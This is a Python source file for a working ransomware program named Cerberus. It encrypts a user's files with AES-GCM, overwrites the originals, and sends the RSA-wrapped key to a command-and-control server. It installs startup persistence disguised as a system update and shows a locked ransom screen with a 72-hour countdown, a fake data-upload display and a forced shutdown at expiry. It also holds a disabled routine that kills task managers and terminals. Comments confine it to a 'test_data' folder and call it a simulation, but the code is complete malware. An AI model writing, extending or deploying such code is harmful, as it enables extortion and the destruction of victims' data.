# ransomware.py
import os
import sys
import base64
import json
import threading
import time
import socket
import shutil
import subprocess
import ctypes

# DEBUG: Crash Logging for Imports
try:
    from tkinter import Tk, Label, Entry, Button, StringVar, Frame, PhotoImage, messagebox
    from tkinter import font as tkfont
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    from cryptography.hazmat.backends import default_backend
    import requests
except ImportError as e:
    try:
        debug_path = os.path.join(os.path.expanduser("~"), "RANSOMWARE_IMPORT_ERROR.txt")
        with open(debug_path, "w") as f:
            f.write(f"Failed to import modules: {e}")
    except: pass
    sys.exit(1)

# --- Configuration ---
# PASTE THE PUBLIC KEY FROM THE C2 SERVER'S CONSOLE OUTPUT HERE
ATTACKER_PUBLIC_KEY = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAyX1m6vQkFgHqCwG9xN8
... (Your public key will be here) ...
FQIDAQAB
-----END PUBLIC KEY-----"""

C2_SERVER_URL = "http://127.0.0.1:5000" # Change if your C2 is hosted elsewhere

# --- PATH CONFIGURATION ---
def get_paths():
    """Determines stable paths for config and target data."""
    home = os.path.expanduser("~")
    
    if os.name == 'nt':
        config_dir = os.path.join(os.environ.get('APPDATA', home), "Cerberus")
    else:
        config_dir = os.path.join(home, ".config", "cerberus")
        
    # ENCRYPT ONLY 'test_data' IN HOME DIRECTORY
    target_dir = os.path.join(home, "test_data")
    
    if not os.path.exists(config_dir):
        try: os.makedirs(config_dir)
        except: pass
        
    return config_dir, target_dir

CONFIG_DIR, TARGET_DIRECTORY = get_paths()

# Persistence Files (Stored in HIDDEN Config Dir)
LOCK_FILE = os.path.join(CONFIG_DIR, ".cerberus_lock")
ID_FILE = os.path.join(CONFIG_DIR, "cerberus_id.txt") 
KEY_BACKUP_FILE = os.path.join(CONFIG_DIR, "cerberus_key.bak")
LOG_FILE = os.path.join(CONFIG_DIR, "cerberus_log.txt")

# Cleanup Marker (Can stay in config dir or be global)
CLEAN_MARKER = os.path.join(CONFIG_DIR, ".cerberus_freed")

ENCRYPTED_EXTENSION = ".cerberus"

# --- File Type Targeting ---
TARGET_EXTENSIONS = {
    '.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf',
    '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
    '.mp3', '.wav', '.mp4', '.avi', '.mov', '.mkv', '.sql', '.db'
}

# --- GUI Asset (Base64 encoded 1x1 red pixel for logo) ---
LOGO_BASE64 = """
iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8/5+hHgAHggJ/PchI7wAAAABJRU5ErkJggg==
"""

# --- Persistence Utilities ---
def install_persistence():
    """Installs the ransomware to run on startup using absolute paths."""
    try:
        if getattr(sys, 'frozen', False):
            app_path = sys.executable
        else:
            app_path = os.path.abspath(__file__)
            
        if os.name == 'nt':
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                cmd = f'"{app_path}"'
                winreg.SetValueEx(key, "WindowsSystemUpdate", 0, winreg.REG_SZ, cmd)
                winreg.CloseKey(key)
            except Exception as e:
                log_error(f"Windows persistence failed: {e}")
        else:
            autostart_dir = os.path.expanduser("~/.config/autostart")
            if not os.path.exists(autostart_dir):
                try: os.makedirs(autostart_dir)
                except: pass
            
            desktop_file = os.path.join(autostart_dir, "system_update.desktop")
            with open(desktop_file, "w") as f:
                f.write(f"[Desktop Entry]\n")
                f.write(f"Type=Application\n")
                f.write(f"Name=System Critical Update\n")
                # Command: python3 /path/to/ransomware.py
                if getattr(sys, 'frozen', False):
                     cmd = f"{app_path}"
                else:
                     cmd = f"{sys.executable} {app_path}"
                f.write(f"Exec={cmd}\n")
                f.write(f"Terminal=false\n")
                f.write(f"X-GNOME-Autostart-enabled=true\n")
            
            try: subprocess.run(['chmod', '+x', desktop_file])
            except: pass
            
    except Exception as e:
        log_error(f"Persistence installation failed: {e}")

def remove_persistence():
    """Removes the persistence mechanism."""
    try:
        if os.name == 'nt':
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            try:
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.DeleteValue(key, "WindowsSystemUpdate")
                winreg.CloseKey(key)
            except Exception as e:
                pass 
        else:
            paths = [
                os.path.expanduser("~/.config/autostart/system_update.desktop"),
                os.path.expanduser("~/.local/share/applications/system_update.desktop")
            ]
            for p in paths:
                if os.path.exists(p):
                    os.remove(p)
    except Exception as e:
        log_error(f"Persistence removal failed: {e}")

# --- System Lockdown Utilities ---
def hide_console():
    if os.name == 'nt':
        try:
            import ctypes
            kernel32 = ctypes.WinDLL('kernel32')
            user32 = ctypes.WinDLL('user32')
            hWnd = kernel32.GetConsoleWindow()
            if hWnd:
                user32.ShowWindow(hWnd, 0) # SW_HIDE = 0
        except Exception as e:
            pass

# --- Cryptography ---
def generate_aes_key():
    return os.urandom(32)

def encrypt_file_aes_gcm(file_path, key):
    try:
        with open(file_path, 'rb') as f:
            data = f.read()
        nonce = os.urandom(12)
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce), backend=default_backend())
        encryptor = cipher.encryptor()
        encrypted_data = encryptor.update(data) + encryptor.finalize()
        with open(file_path + ENCRYPTED_EXTENSION, 'wb') as f:
            f.write(nonce + encryptor.tag + encrypted_data)
        return True
    except Exception as e:
        log_error(f"Failed to encrypt {file_path}: {e}")
        return False

def decrypt_file_aes_gcm(encrypted_path, key):
    try:
        with open(encrypted_path, 'rb') as f:
            nonce_tag_data = f.read()
        nonce, tag, encrypted_data = nonce_tag_data[:12], nonce_tag_data[12:28], nonce_tag_data[28:]
        cipher = Cipher(algorithms.AES(key), modes.GCM(nonce, tag), backend=default_backend())
        decryptor = cipher.decryptor()
        decrypted_data = decryptor.update(encrypted_data) + decryptor.finalize()
        original_path = encrypted_path.removesuffix(ENCRYPTED_EXTENSION)
        with open(original_path, 'wb') as f:
            f.write(decrypted_data)
        os.remove(encrypted_path)
        return True
    except Exception as e:
        log_error(f"Failed to decrypt {encrypted_path}: {e}")
        return False

def secure_delete_file(file_path, passes=1): 
    try:
        if os.path.exists(file_path):
            with open(file_path, "ba+") as f:
                length = f.tell()
            with open(file_path, "r+b") as f:
                f.write(os.urandom(length))
            os.remove(file_path)
    except Exception as e:
        log_error(f"Failed to securely delete {file_path}: {e}")

# --- Logging ---
def log_error(message):
    try:
        with open(LOG_FILE, 'a') as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} - ERROR: {message}\n")
    except:
        pass 

# --- Ransomware Logic ---
def encrypt_directory():
    if not os.path.exists(TARGET_DIRECTORY):
        try: os.makedirs(TARGET_DIRECTORY)
        except: pass

    if os.path.exists(KEY_BACKUP_FILE):
        log_error("Found key backup. Resuming from crash...")
        try:
            with open(KEY_BACKUP_FILE, 'rb') as f:
                return f.read()
        except:
            pass 

    if os.path.exists(LOCK_FILE):
        log_error("Encryption seemingly complete (Lock file exists).")
        return None

    aes_key = generate_aes_key()
    
    try:
        with open(KEY_BACKUP_FILE, 'wb') as f:
            f.write(aes_key)
    except Exception as e:
        log_error(f"Failed to write key backup: {e}")

    encrypted_files = 0
    # ONLY WALK TARGET_DIRECTORY
    if os.path.exists(TARGET_DIRECTORY):
        for root, _, files in os.walk(TARGET_DIRECTORY):
            for file in files:
                file_path = os.path.join(root, file)
                if os.path.splitext(file)[1].lower() in TARGET_EXTENSIONS and not file_path.endswith(ENCRYPTED_EXTENSION):
                    if encrypt_file_aes_gcm(file_path, aes_key):
                        secure_delete_file(file_path)
                        encrypted_files += 1

    with open(LOCK_FILE, 'w') as f:
        f.write("Encryption complete.")

    log_error(f"Encryption finished. {encrypted_files} files targeted.")
    return aes_key

def check_in_with_c2(aes_key):
    try:
        from cryptography.hazmat.primitives import serialization
        from cryptography.hazmat.primitives.asymmetric import padding
        
        public_key = serialization.load_pem_public_key(ATTACKER_PUBLIC_KEY.encode(), backend=default_backend())
        encrypted_aes_key = public_key.encrypt(
            aes_key,
            padding.OAEP(
                mgf=padding.MGF1(algorithm=hashes.SHA256()),
                algorithm=hashes.SHA256(),
                label=None
            )
        )
        payload = {"key": base64.b64encode(encrypted_aes_key).decode('utf-8')}
        
        victim_id = None
        log_error(f"Attempting to connect to C2 at: {C2_SERVER_URL}")
        
        for _ in range(3):
            try:
                response = requests.post(f"{C2_SERVER_URL}/api/checkin", json=payload, timeout=5)
                if response.status_code == 200:
                    victim_id = response.json().get('victim_id')
                    log_error(f"Connected! Victim ID: {victim_id}")
                    break
            except Exception as e:
                log_error(f"Connection attempt failed: {e}")
                time.sleep(2)
        
        if not victim_id:
            # --- OFFLINE FALLBACK ---
            log_error("C2 Unreachable. Switching to OFFLINE MODE.")
            # Generate a local ID so the GUI still launches
            victim_id = "OFFLINE-" + base64.urlsafe_b64encode(os.urandom(4)).decode('utf-8').rstrip('=')
            
            # Save the key locally for manual recovery if needed (in a real scenario this might differ)
            # For this educational/sim, we just keep the key backup file as the 'key store'
            # or we could write it to a separate hidden file.
            pass

        with open(ID_FILE, 'w') as f:
            f.write(victim_id)
        
        # If we are offline, we DO NOT delete the key backup, so we can recover it manually if needed.
        # If we are online, we delete it to force payment.
        if "OFFLINE" not in victim_id and os.path.exists(KEY_BACKUP_FILE):
             os.remove(KEY_BACKUP_FILE)
            
        log_error(f"Check-in complete. Final Victim ID: {victim_id}")
        return victim_id

    except Exception as e:
        log_error(f"C2 check-in critical failure: {e}")
        # Ultimate fallback
        return "CRITICAL-FAILURE"

# --- GUI Logic ---
class RansomwareGUI:
    def __init__(self, master, victim_id):
        self.master = master
        self.victim_id = victim_id
        self.doomsday_triggered = False
        self.payment_mode_active = False

        # WINDOWED MODE (Movable, Fake-Closable)
        master.title("CERBERUS RANSOMWARE - ENCRYPTED")
        master.geometry("1024x768") 
        master.attributes('-fullscreen', False) 
        master.overrideredirect(False) # Show Title Bar (X button)
        master.attributes('-topmost', True)
        master.configure(bg='#0a0a0a')
        master.resizable(False, False)
        
        # RAGEBAIT CLOSE
        master.protocol("WM_DELETE_WINDOW", self.ragebait_close) 
        
        # Disable minimalize/keyboard shortcuts
        master.bind('<Escape>', lambda e: "break")
        
        # Aggressive Loop
        self.force_focus_loop()

        # GUI Elements
        try:
            logo_data = base64.b64decode(LOGO_BASE64)
            self.logo = PhotoImage(data=logo_data)
        except:
            self.logo = None

        main_frame = Frame(master, bg='#0a0a0a')
        main_frame.pack(expand=True, fill='both', padx=20, pady=20)

        if self.logo:
            Label(main_frame, image=self.logo, bg='#0a0a0a').pack(pady=10)

        title_font = tkfont.Font(family="Helvetica", size=24, weight="bold")
        body_font = tkfont.Font(family="Helvetica", size=12)
        mono_font = tkfont.Font(family="Courier", size=12)
        timer_font = tkfont.Font(family="Courier", size=36, weight="bold")

        Label(main_frame, text="YOUR FILES HAVE BEEN ENCRYPTED", font=title_font, fg='#ff4d4d', bg='#0a0a0a').pack(pady=10)
        Label(main_frame, text="Your documents, photos, and other important files have been locked.", font=body_font, fg='#cccccc', bg='#0a0a0a', wraplength=700).pack(pady=5)
        
        # DOOMSDAY TIMER
        self.time_left = 72 * 3600 
        Label(main_frame, text="TIME REMAINING UNTIL PERMANENT DATA LOSS:", font=tkfont.Font(family="Helvetica", size=12, weight="bold"), fg='#ff3333', bg='#0a0a0a').pack(pady=(20, 5))
        self.timer_label = Label(main_frame, text="72:00:00", font=timer_font, fg='#ff0000', bg='#0a0a0a')
        self.timer_label.pack(pady=5)
        
        # FAKE EXFILTRATION
        self.exfil_status = Label(main_frame, text="System Scan: Analyzing private data...", font=mono_font, fg='#ffff00', bg='#0a0a0a')
        self.exfil_status.pack(pady=(15, 5))
        self.exfil_progress = Label(main_frame, text="[                    ] 0%", font=mono_font, fg='#ffff00', bg='#0a0a0a')
        self.exfil_progress.pack()
        
        Label(main_frame, text=f"YOUR VICTIM ID IS:", font=body_font, fg='#ffffff', bg='#0a0a0a').pack(pady=(20, 5))
        self.victim_id_label = Label(main_frame, text=self.victim_id, font=tkfont.Font(family="Courier", size=20, weight="bold"), fg='#4dff88', bg='#0a0a0a')
        self.victim_id_label.pack()

        self.status_label = Label(main_frame, text="STATUS: Awaiting payment confirmation... (Don't close this window)", font=body_font, fg='#ffff4d', bg='#0a0a0a')
        self.status_label.pack(pady=(20, 5))
        
        self.key_var = StringVar()
        self.key_entry = Entry(main_frame, textvariable=self.key_var, font=tkfont.Font(family="Courier", size=12), show="*", width=50, bg='#2a2a2a', fg='#ffffff', insertbackground='white', justify='center')
        self.key_entry.pack(pady=10, ipady=5)
        self.key_entry.config(state='readonly')

        self.decrypt_button = Button(main_frame, text="DECRYPT FILES", font=tkfont.Font(family="Helvetica", size=14, weight="bold"), command=self.start_decryption, bg='#ff4d4d', fg='white', padx=20, pady=10)
        self.decrypt_button.pack(pady=10)
        self.decrypt_button.config(state='disabled') 
        
        # PAYMENT BUTTON (Fixed Layout - Packed at bottom)
        self.pay_button = Button(main_frame, text="PAY RANSOM NOW", font=tkfont.Font(family="Helvetica", size=11, weight="bold"), command=self.enable_payment_mode, bg='#007bff', fg='white', padx=15, pady=8)
        self.pay_button.pack(side='bottom', pady=20)

        # Start threads
        self.heartbeat_thread_running = True
        threading.Thread(target=self.heartbeat_polling, daemon=True).start()
        threading.Thread(target=self.update_timer, daemon=True).start()
        threading.Thread(target=self.fake_exfiltration, daemon=True).start()
        
        self.master.after(2000, self.change_wallpaper)
        threading.Thread(target=self.audio_loop, daemon=True).start()
        # threading.Thread(target=self.watchdog_loop, daemon=True).start() # DISABLED: Causing System Lag

    def ragebait_close(self):
        """Intercepts close request and trolls the user."""
        try:
            if messagebox.askyesno("Exit Application", "Are you sure you want to quit this application?"):
                messagebox.showerror("Access Denied", "LOL you thought you could escape. Access Denied.")
                # Run TTS in a separate thread to avoid blocking GUI
                threading.Thread(target=self.speak_message, args=("You cannot leave.",), daemon=True).start()
        except: pass

    def force_focus_loop(self):
        """Aggressively keeps window on top, unless paying. REDUCED FREQUENCY."""
        if not self.payment_mode_active:
            try:
                self.master.lift()
            except:
                pass
        # Reduced to 3000ms to stop stuttering
        self.master.after(3000, self.force_focus_loop)

    def speak_message(self, message):
        """Cross-platform TTS. Synchronous (blocking) version for threads."""
        try:
            if os.name == 'nt':
                cmd = f"Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('{message}')"
                subprocess.run(["powershell", "-Command", cmd], creationflags=subprocess.CREATE_NO_WINDOW)
            else:
                if shutil.which("espeak"):
                        subprocess.run(["espeak", message], stderr=subprocess.DEVNULL)
                elif shutil.which("spd-say"):
                        subprocess.run(["spd-say", message], stderr=subprocess.DEVNULL)
        except:
            pass
        
    def audio_loop(self):
        """Repeats the voice message every 30 seconds."""
        message = "Your files are encrypted. Payment is required. System failure imminent."
        while self.heartbeat_thread_running:
            self.speak_message(message)
            time.sleep(30)
            
    def watchdog_loop(self):
        """Kills task managers and terminals."""
        blacklist = [
            'taskmgr', 'cmd', 'powershell', 
            'gnome-terminal-server', 'gnome-terminal', # GNOME
            'konsole', # KDE
            'xfce4-terminal', 'xterm', 'uxterm',
            'bash', 'sh', 'zsh', 'fish', # Shells (Aggressive)
            'htop', 'top', 'btop', 'wireshark'
        ]
        
        while self.heartbeat_thread_running:
            try:
                if os.name == 'nt':
                    for proc in blacklist:
                        os.system(f"taskkill /F /IM {proc}.exe >nul 2>&1")
                else:
                    # Linux Optimization: pkill implies internal loop, calling it 10x per sec is bad.
                    # We run this every 3 seconds now.
                    for proc in blacklist:
                            os.system(f"pkill -9 -f {proc} >/dev/null 2>&1")
            except:
                pass
            # Increased from 1.0s to 3.0s to reduce system load/stuttering
            time.sleep(3.0) 

    def change_wallpaper(self):
        pass

    def trigger_doomsday(self):
        if self.doomsday_triggered: return
        self.doomsday_triggered = True
        
        threading.Thread(target=self.speak_message, args=("Time has expired. System failure imminent.",), daemon=True).start()
        self.master.configure(bg='#ff0000') # RED ALERT
        
        try:
            if os.name == 'nt':
                os.system("shutdown /s /t 15 /c \"CERBERUS: TIME EXPIRED\"")
            else:
                os.system("shutdown -h +1 \"CERBERUS: TIME EXPIRED\"") 
        except:
            pass

    def update_timer(self):
        while self.heartbeat_thread_running and self.time_left > 0:
            time.sleep(1)
            self.time_left -= 1
            
            if self.time_left <= 0:
                self.master.after(0, self.trigger_doomsday)
                try: self.timer_label.config(text="00:00:00")
                except: pass
                break
            
            m, s = divmod(self.time_left, 60)
            h, m = divmod(m, 60)
            time_str = f"{h:02d}:{m:02d}:{s:02d}"
            
            try:
                self.timer_label.config(text=time_str)
                if self.time_left < 3600:
                    self.timer_label.config(fg='#ff0000' if self.time_left % 2 == 0 else '#ffffff')
            except:
                pass

    def fake_exfiltration(self):
        stages = [ "Scanning...", "Compressing...", "Encrypting...", "Connecting...", "Uploading...", "Complete." ]
        for stage in stages:
            if not self.heartbeat_thread_running: break
            try: self.exfil_status.config(text=f"STATUS: {stage}")
            except: pass
            time.sleep(2)
        try: self.exfil_status.config(text="STATUS: UPLOAD COMPLETE", fg='#ff0000')
        except: pass

    def heartbeat_polling(self):
        while self.heartbeat_thread_running:
            try:
                response = requests.get(f"{C2_SERVER_URL}/api/status/{self.victim_id}?time_left={self.time_left}", timeout=5)
                if response.status_code == 200:
                    data = response.json()
                    if "new_timer" in data:
                        self.time_left = int(data["new_timer"])
                    if data.get("status") == "ready":
                        key = data.get("key")
                        if key:
                            self.master.after(0, self.update_key_field, key)
                            self.heartbeat_thread_running = False
            except:
                pass
            time.sleep(5) 

    def update_key_field(self, key):
        self.key_var.set(key)
        self.key_entry.config(state='normal')
        self.status_label.config(text="STATUS: Valid key received. Decryption enabled.", fg='#4dff88')
        self.decrypt_button.config(state='normal')
        self.key_entry.config(state='readonly')
        
    def enable_payment_mode(self):
        self.payment_mode_active = True
        self.status_label.config(text="STATUS: BROWSER UNLOCKED FOR PAYMENT. DO NOT CLOSE.", fg='cyan')
        
        try:
             self.master.grab_release()
             self.master.attributes('-topmost', False)
             self.master.overrideredirect(False) 
             self.master.iconify()
        except:
             pass
             
        try:
            import webbrowser
            webbrowser.open("https://www.google.com/search?q=bitcoin+payment") 
        except:
            pass
            
        self.master.after(120000, self.disable_payment_mode)

    def disable_payment_mode(self):
        self.payment_mode_active = False
        self.master.deiconify() 
        self.master.attributes('-fullscreen', False) # Not fullscreen anymore!
        self.master.attributes('-topmost', True)
        self.master.overrideredirect(False)
        self.status_label.config(text="STATUS: LOCKED.", fg='#ffff4d')

    def start_decryption(self):
        key_b64 = self.key_var.get()
        if not key_b64:
            return
        
        self.status_label.config(text="STATUS: Decrypting files... Please wait.", fg='yellow')
        self.master.update()
        
        try:
            key = base64.b64decode(key_b64)
            decrypted_files = 0
            if os.path.exists(TARGET_DIRECTORY):
                for root, _, files in os.walk(TARGET_DIRECTORY):
                    for file in files:
                        if file.endswith(ENCRYPTED_EXTENSION):
                            file_path = os.path.join(root, file)
                            if decrypt_file_aes_gcm(file_path, key):
                                decrypted_files += 1
            
            # --- CLEAN UP ---
            self.heartbeat_thread_running = False # Stop all background threads
            
            # 1. Remove Persistence
            remove_persistence()
            
            # 2. Mark as Clean
            try:
                 with open(CLEAN_MARKER, 'w') as f: f.write("Freed")
            except: pass

            # 3. Nuke Config Directory
            if os.path.exists(CONFIG_DIR):
                try: shutil.rmtree(CONFIG_DIR)
                except: pass
            
            self.status_label.config(text=f"SUCCESS! {decrypted_files} files decrypted. System Cleaned.", fg='#4dff88')
            messagebox.showinfo("Decryption Complete", "Your files have been restored and the ransomware removed.\nExiting now.")
            
        except Exception as e:
            log_error(f"Decryption failed: {e}")
            self.status_label.config(text="ERROR: Decryption failed.", fg='red')
            messagebox.showerror("Error", f"Decryption failed: {e}")
        
        finally:
            # FORCE EXIT NO MATTER WHAT
            try:
                self.master.grab_release() 
                self.master.destroy() 
            except: pass
            os._exit(0) # Hard exit to kill all threads

# --- Main Execution ---
if __name__ == "__main__":
    if os.path.exists(CLEAN_MARKER):
        # Double check if cleaner didn't finish
        pass 
    
    # 0. Persistence Installation
    install_persistence()

    hide_console()

    # PERSISTENCE CHECK-IN
    # Check ID file in stable CONFIG_DIR
    if os.path.exists(ID_FILE):
        try:
            with open(ID_FILE, 'r') as f:
                victim_id = f.read().strip()
            if victim_id:
                log_error(f"Resuming session for Victim ID: {victim_id}")
                root = Tk()
                app = RansomwareGUI(root, victim_id)
                root.mainloop()
                sys.exit()
        except:
            pass 
    
    # NEW INFECTION
    aes_key = encrypt_directory()
    
    if aes_key:
        victim_id = check_in_with_c2(aes_key)
        if victim_id:
            root = Tk()
            app = RansomwareGUI(root, victim_id)
            root.mainloop()
        else:
            log_error("Failed to get Victim ID. Aborting GUI.")
    else:
        log_error("Encryption skipped or failed. Aborting.")
